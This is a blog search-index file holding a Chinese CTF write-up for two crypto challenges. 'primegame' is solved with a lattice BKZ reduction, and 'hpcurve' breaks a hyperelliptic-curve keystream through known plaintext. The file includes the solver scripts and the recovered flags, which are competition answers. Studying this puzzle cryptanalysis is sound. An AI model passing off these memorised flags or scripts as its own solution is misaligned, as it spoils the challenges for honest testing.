<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>20210509 RedhatCrypto方向WP</title>
    <url>/posts/e881af84/</url>
    <content><![CDATA[<p>emmmmm发现都是原题，当时还不善用搜索引擎，打得不怎么样</p>
<span id="more"></span>

<h1 id="20210509-RedhatCrypto方向WP"><a href="#20210509-RedhatCrypto方向WP" class="headerlink" title="20210509 RedhatCrypto方向WP"></a>20210509 RedhatCrypto方向WP</h1><h2 id="primegame（recuring）"><a href="#primegame（recuring）" class="headerlink" title="primegame（recuring）"></a>primegame（recuring）</h2><h3 id="一、题目"><a href="#一、题目" class="headerlink" title="一、题目"></a>一、题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (<span class="built_in">len</span>(flag) == <span class="number">48</span>)</span><br><span class="line">msg1 = flag[:<span class="number">24</span>]</span><br><span class="line">msg2 = flag[<span class="number">24</span>:]                        </span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">90</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">100</span></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg1)):</span><br><span class="line">    keys.append(Decimal(primes[i]).ln())</span><br><span class="line"></span><br><span class="line">sum_ = Decimal(<span class="number">0.0</span>)</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg1):</span><br><span class="line">    sum_ += c * Decimal(keys[i])</span><br><span class="line"></span><br><span class="line">ct = math.floor(sum_ * <span class="number">2</span> ** <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)                  </span><br><span class="line"></span><br><span class="line">sum_ = Decimal(<span class="number">0.0</span>)</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg2):</span><br><span class="line">    sum_ += c * Decimal(keys[i])</span><br><span class="line"></span><br><span class="line">ct = math.floor(sum_ * <span class="number">2</span> ** <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ct1 = 597952043660446249020184773232983974017780255881942379044454676980646417087515453</span><br><span class="line">ct2 = 425985475047781336789963300910446852783032712598571885345660550546372063410589918</span><br></pre></td></tr></table></figure>

<h3 id="二、解题思路"><a href="#二、解题思路" class="headerlink" title="二、解题思路"></a>二、解题思路</h3><p>这道题原本的思路是加一个底数e，然后依次逼近msg里的各个值的</p>
<img alt="README-ea39f5b9.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-ea39f5b9.png" width="" height="" >

<p>但是几次给我sage跑挂了，应该是精度和容量问题，而且sage不支持decimal设置精度</p>
<p>然后想到之前有道类似的题目，因为它这里一直在c乘以keys[i]，有24组，所以就想到了格，构造一个类似这样子的格</p>
<img alt="README-423b7374.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-423b7374.png" width="" height="" >

<p>先是得到我们的对数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">90</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">100</span>         <span class="comment"># 设置精度</span></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    keys.append(Decimal(primes[i]).ln())</span><br></pre></td></tr></table></figure>

<p>然后将矩阵第一列求出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    keys[i] = keys[i]*<span class="number">2</span>**<span class="number">256</span></span><br><span class="line"><span class="comment"># keys = [Decimal(&#x27;80260960185991308862233904206310070533990667611589946606122867505419956976171.90515840808613629846290&#x27;), Decimal(&#x27;127210612166669937440098469708903225618405881204503139663605609326034899514764.6663743746583129556012&#x27;), Decimal(&#x27;186360178378489239360019555208872516895923557828929525429878875918225512971166.4414609219754360277383&#x27;), Decimal(&#x27;225321001627212097357564035919404985096695078055324870037864774600825628967482.2417219510600154726596&#x27;), Decimal(&#x27;277657303409607584257674154656459195924000370301674371438196861060248384105244.3993444331039604677255&#x27;), Decimal(&#x27;297000844888383098784779809484430885883324243241834148304083596811292939014380.4674208212385311778134&#x27;), Decimal(&#x27;328063692363312405002199287825630301497469991361288129915249443621480610038009.0012924032254942097990&#x27;), Decimal(&#x27;340942741029472675751209085563496509709453734782185827155063370803195952763341.5492681559934516393628&#x27;), Decimal(&#x27;363065426053956876789136573439806831974720562089628946045509535722562500188081.9345554269406941498189&#x27;), Decimal(&#x27;389906219234236504589839583602940131460157322576695243167328885608693810978037.4477298393894375836391&#x27;), Decimal(&#x27;397628552821546031788284866976481005071491904149911534621248760160933669557251.4099945654069429986781&#x27;), Decimal(&#x27;418115729169523563213795873608243120399117141324174913328486917994007765693981.2677229007073901042419&#x27;), Decimal(&#x27;430002268137029940210248704949846802606196021901113383903617291334026458415238.4390037473159660462055&#x27;), Decimal(&#x27;435517219435792978548914327540992832715555899417703687725132714593809971489386.4866743125661788819556&#x27;), Decimal(&#x27;445816634674050036737403156155461234669588861822924489511566801569753428925196.7122521424369127568677&#x27;), Decimal(&#x27;459728395552222169203258553855093151725069310363221663578223702572833827483180.5712997266924709004859&#x27;), Decimal(&#x27;472146579573229247119622639984879073370128462957392372371001752039887754216862.2605246111880684783030&#x27;), Decimal(&#x27;476006673323706912851925923936227700248085741335072682402231383534286110106849.6653976943352393620303&#x27;), Decimal(&#x27;486870143000003523136729364348591878682677901545106867214896561445453739365505.3439314072483902595509&#x27;), Decimal(&#x27;493584608712480022671713045430033257561446779236439588774651853861690675528490.3655085296010121315316&#x27;), Decimal(&#x27;496801262478540279019120702773153789961300482567894655561867654179758267817025.5210934638564971187839&#x27;), Decimal(&#x27;505947495650660962867352926325259167807382070922044420606608075589355194666475.2011794828006546336392&#x27;), Decimal(&#x27;511666785983460201877755690981276626403123717604080991115075395552267140888834.5141513226162039281301&#x27;), Decimal(&#x27;519748583077886948223642831481589001894608334341623554432584379082164654601617.7552630658083904530520&#x27;)]</span></span><br></pre></td></tr></table></figure>

<p>这里因为格式的种种问题，直接将keys取整数提出来了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">keys = [<span class="number">80260960185991308862233904206310070533990667611589946606122867505419956976171</span>, <span class="number">127210612166669937440098469708903225618405881204503139663605609326034899514764</span>, <span class="number">186360178378489239360019555208872516895923557828929525429878875918225512971166</span>, <span class="number">225321001627212097357564035919404985096695078055324870037864774600825628967482</span>, <span class="number">277657303409607584257674154656459195924000370301674371438196861060248384105244</span>, <span class="number">297000844888383098784779809484430885883324243241834148304083596811292939014380</span>, <span class="number">328063692363312405002199287825630301497469991361288129915249443621480610038009</span>, <span class="number">340942741029472675751209085563496509709453734782185827155063370803195952763341</span>, <span class="number">363065426053956876789136573439806831974720562089628946045509535722562500188081</span>, <span class="number">389906219234236504589839583602940131460157322576695243167328885608693810978037</span>, <span class="number">397628552821546031788284866976481005071491904149911534621248760160933669557251</span>, <span class="number">418115729169523563213795873608243120399117141324174913328486917994007765693981</span>, <span class="number">430002268137029940210248704949846802606196021901113383903617291334026458415238</span>, <span class="number">435517219435792978548914327540992832715555899417703687725132714593809971489386</span>, <span class="number">445816634674050036737403156155461234669588861822924489511566801569753428925196</span>, <span class="number">459728395552222169203258553855093151725069310363221663578223702572833827483180</span>, <span class="number">472146579573229247119622639984879073370128462957392372371001752039887754216862</span>, <span class="number">476006673323706912851925923936227700248085741335072682402231383534286110106849</span>, <span class="number">486870143000003523136729364348591878682677901545106867214896561445453739365505</span>, <span class="number">493584608712480022671713045430033257561446779236439588774651853861690675528490</span>, <span class="number">496801262478540279019120702773153789961300482567894655561867654179758267817025</span>, <span class="number">505947495650660962867352926325259167807382070922044420606608075589355194666475</span>, <span class="number">511666785983460201877755690981276626403123717604080991115075395552267140888834</span>, <span class="number">519748583077886948223642831481589001894608334341623554432584379082164654601617</span>]</span><br></pre></td></tr></table></figure>

<p>构造格</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = matrix(ZZ, <span class="number">25</span>, <span class="number">25</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    m[i, i]=<span class="number">1</span></span><br><span class="line">    m[<span class="number">24</span>, i] = keys[i]</span><br><span class="line">m[<span class="number">24</span>, <span class="number">24</span>]= -ct1</span><br><span class="line"></span><br><span class="line">c1= m.transpose().BKZ()[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>跑出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c1 = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">55</span>, <span class="number">49</span>, <span class="number">53</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">57</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">49</span>, <span class="number">98</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">52</span>, <span class="number">99</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">845</span>]</span><br></pre></td></tr></table></figure>

<p>同理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c2 = [<span class="number">56</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">98</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">125</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">604</span>]</span><br></pre></td></tr></table></figure>

<p>最后转一下ascii</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c2:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="string">&#x27;0x66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#x27;</span>, <span class="number">16</span>)))</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;715c39c3-1b46-4c23-͍<span class="number">8006</span>-27b43eba2446&#125;      ɜ</span><br></pre></td></tr></table></figure>

<p>有点奇怪，把奇怪的地方去掉，就好了</p>
<h2 id="hpcurve（unsolved）"><a href="#hpcurve（unsolved）" class="headerlink" title="hpcurve（unsolved）"></a>hpcurve（unsolved）</h2><p>完全不懂，师傅没必要看了，只是改脚本的屑</p>
<h3 id="一、题目-1"><a href="#一、题目-1" class="headerlink" title="一、题目"></a>一、题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line">R.&lt;x&gt; = GF(p)[]</span><br><span class="line">y=x</span><br><span class="line">f = y + y^<span class="number">7</span></span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line"></span><br><span class="line">es = [SystemRandom().randrange(p**<span class="number">3</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line">q = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clk</span>():</span></span><br><span class="line">	<span class="keyword">global</span> Ds,es</span><br><span class="line">	Ds = [e*D <span class="keyword">for</span> e,D <span class="keyword">in</span> <span class="built_in">zip</span>(es, Ds)]</span><br><span class="line">	<span class="keyword">return</span> Ds</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    u,v = <span class="built_in">sum</span>(clk())</span><br><span class="line">    rs = [u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)] + [v[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span> rs <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">not</span> <span class="keyword">in</span> rs</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxx&#125;&quot;</span></span><br><span class="line">text = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+flag</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">keys = generate()</span><br><span class="line">leng = <span class="built_in">len</span>(keys)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">    t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(keys[i%leng])^^<span class="built_in">ord</span>(x))</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(t.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="comment">#for x,y in zip(RNG(),flag):</span></span><br><span class="line"></span><br><span class="line">flag&#123;1b82f60a-43ab-4f18-8ccc</span><br></pre></td></tr></table></figure>

<h3 id="二、解题脚本"><a href="#二、解题脚本" class="headerlink" title="二、解题脚本"></a>二、解题脚本</h3><p>是hxpCTF2020的题目</p>
<p>原题是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = GF(p)[]; y=x</span><br><span class="line">f = y + prod(<span class="built_in">map</span>(<span class="built_in">eval</span>, <span class="string">&#x27;yyyyyyy&#x27;</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RNG</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.es = [SystemRandom().randrange(p**<span class="number">3</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">        self.Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line">        self.q = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clk</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.Ds = [e*D <span class="keyword">for</span> e,D <span class="keyword">in</span> <span class="built_in">zip</span>(self.es, self.Ds)]</span><br><span class="line">        <span class="keyword">return</span> self.Ds</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.q:</span><br><span class="line">            u,v = <span class="built_in">sum</span>(self.clk())</span><br><span class="line">            rs = [u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)] + [v[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">            <span class="keyword">assert</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span> rs <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">not</span> <span class="keyword">in</span> rs</span><br><span class="line">            self.q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">        r, self.q = self.q[<span class="number">0</span>], self.q[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span>(<span class="params">self</span>):</span> <span class="keyword">return</span> self</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span>(<span class="params">self</span>):</span> <span class="keyword">return</span> self()</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read().strip()</span><br><span class="line"><span class="keyword">import</span> re; <span class="keyword">assert</span> re.match(<span class="string">r&#x27;hxp\&#123;\w+\&#125;&#x27;</span>, flag, re.ASCII)</span><br><span class="line"></span><br><span class="line">text = <span class="string">f&quot;Hello! The flag is: <span class="subst">&#123;flag&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(k^^m <span class="keyword">for</span> k,m <span class="keyword">in</span> <span class="built_in">zip</span>(RNG(), text.encode())).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>显然代码对比起来看，<code>f = y + y^7</code>只是<code>f = y + prod(map(eval, &#39;yyyyyyy&#39;))</code>变换一种形式，主要的不同在</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(keys[i%leng])^^<span class="built_in">ord</span>(x))</span><br></pre></td></tr></table></figure>

<p>这个key的长度不够，是循环取的</p>
<p>找了一些脚本，没怎么看原理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = GF(p)[]; y=x</span><br><span class="line">f = y + prod(<span class="built_in">map</span>(<span class="built_in">eval</span>, <span class="string">&#x27;yyyyyyy&#x27;</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line">Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;a0955c882185b50a69d9d19a24778519d6da23894e667d7130b495b645caac72163d242923caa00af845f25890&#x27;</span>)</span><br><span class="line">known_pt = <span class="string">&#x27;Hello! The flag is: hxp&#123;&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line">rng_output = <span class="built_in">bytes</span>(e^^m <span class="keyword">for</span> e,m <span class="keyword">in</span> <span class="built_in">zip</span>(enc, known_pt))</span><br><span class="line"></span><br><span class="line">blocks = [rng_output[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(rng_output), <span class="number">8</span>)]</span><br><span class="line">ui = [<span class="built_in">int</span>.from_bytes(r, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> r <span class="keyword">in</span> blocks]</span><br><span class="line">u = x^<span class="number">3</span> + ui[<span class="number">2</span>]*x^<span class="number">2</span> + ui[<span class="number">1</span>]*x + ui[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">L = GF(p).algebraic_closure()</span><br><span class="line">roots = [r[<span class="number">0</span>] <span class="keyword">for</span> r <span class="keyword">in</span> u.change_ring(L).roots()]</span><br><span class="line"></span><br><span class="line">RR.&lt;zz&gt; = PolynomialRing(L)</span><br><span class="line">v = RR.lagrange_polynomial([(xi, f(xi).sqrt()) <span class="keyword">for</span> xi <span class="keyword">in</span> roots])</span><br><span class="line">vi = [v.coefficients()[i].as_finite_field_element()[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">vi = [(<span class="built_in">int</span>(-c), <span class="built_in">int</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> vi]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rs <span class="keyword">in</span> itertools.product(*vi):</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line"></span><br><span class="line">    flag = <span class="built_in">bytes</span>(k^^m <span class="keyword">for</span> k,m <span class="keyword">in</span> <span class="built_in">zip</span>(rng_output+q, enc))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>稍微改了下，<code>enc</code>和<code>known_pt</code>是显然要改的，后者就选24度好了，和原脚本一样，虽然题目给了很大一半</p>
<p>还有就是最后这里，就使得key不要越界，取个余</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> rs <span class="keyword">in</span> itertools.product(*vi):</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">    l = rng_output+q</span><br><span class="line">    length = <span class="built_in">len</span>(l)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(l[i % length] ^^ enc[i])</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>不完全正确的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = GF(p)[]; y=x</span><br><span class="line">f = y + prod(<span class="built_in">map</span>(<span class="built_in">eval</span>, <span class="string">&#x27;yyyyyyy&#x27;</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line">Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#x27;</span>)</span><br><span class="line">known_pt = (<span class="string">&#x27;a&#x27;</span> * <span class="number">20</span> + <span class="string">&#x27;flag&#x27;</span>).encode()</span><br><span class="line"></span><br><span class="line">rng_output = <span class="built_in">bytes</span>(e^^m <span class="keyword">for</span> e,m <span class="keyword">in</span> <span class="built_in">zip</span>(enc, known_pt))</span><br><span class="line"></span><br><span class="line">blocks = [rng_output[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(rng_output), <span class="number">8</span>)]</span><br><span class="line">ui = [<span class="built_in">int</span>.from_bytes(r, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> r <span class="keyword">in</span> blocks]</span><br><span class="line">u = x^<span class="number">3</span> + ui[<span class="number">2</span>]*x^<span class="number">2</span> + ui[<span class="number">1</span>]*x + ui[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">L = GF(p).algebraic_closure()</span><br><span class="line">roots = [r[<span class="number">0</span>] <span class="keyword">for</span> r <span class="keyword">in</span> u.change_ring(L).roots()]</span><br><span class="line"></span><br><span class="line">RR.&lt;zz&gt; = PolynomialRing(L)</span><br><span class="line">v = RR.lagrange_polynomial([(xi, f(xi).sqrt()) <span class="keyword">for</span> xi <span class="keyword">in</span> roots])</span><br><span class="line">vi = [v.coefficients()[i].as_finite_field_element()[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">vi = [(<span class="built_in">int</span>(-c), <span class="built_in">int</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> vi]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rs <span class="keyword">in</span> itertools.product(*vi):</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">    l = rng_output+q</span><br><span class="line">    length = <span class="built_in">len</span>(l)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(l[i % length] ^^ enc[i])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>出来</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007201746271.png" alt="image-20211007201746271" style="zoom: 67%;" />

<p>我看最后一串挺执着的，加上已经知道<code>flag&#123;1b82f60a-43ab-4f18-8ccc</code></p>
<p>大胆连在一起</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag&#123;1b82f60a-43ab-4f18-8ccc-97d120aae6fc&#125;</span><br></pre></td></tr></table></figure>

<p>感觉应该是对的</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>格</tag>
      </tags>
  </entry>
  <entry>
    <title>20210516 国赛Crypto方向部分WP</title>
    <url>/posts/766eb6e4/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

